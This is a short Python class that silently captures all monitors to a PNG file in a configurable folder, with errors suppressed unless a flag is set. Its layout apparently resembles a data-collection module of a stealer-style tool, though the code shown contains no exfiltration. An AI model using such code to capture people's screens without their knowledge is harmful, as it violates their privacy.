from os import mkdir, path

from mss import mss


class Screenshot:

    def __init__(self, storage_path: str, folder: str, errors: bool):

        self.__storage_path = storage_path
        self.__folder = folder
        self.__errors = errors

    def __create_folder(self):

        storage_path = rf"{self.__storage_path}\{self.__folder}"

        if not path.exists(storage_path):
            mkdir(storage_path)

    def __create_screen(self):

        with mss() as screen:
            screen.shot(mon=-1, output=rf"{self.__storage_path}\{self.__folder}\Screenshot.png")

    def run(self):

        try:

            self.__create_folder()
            self.__create_screen()

        except Exception as e:
            if self.__errors is True: print(f"[Screenshot]: {repr(e)}")
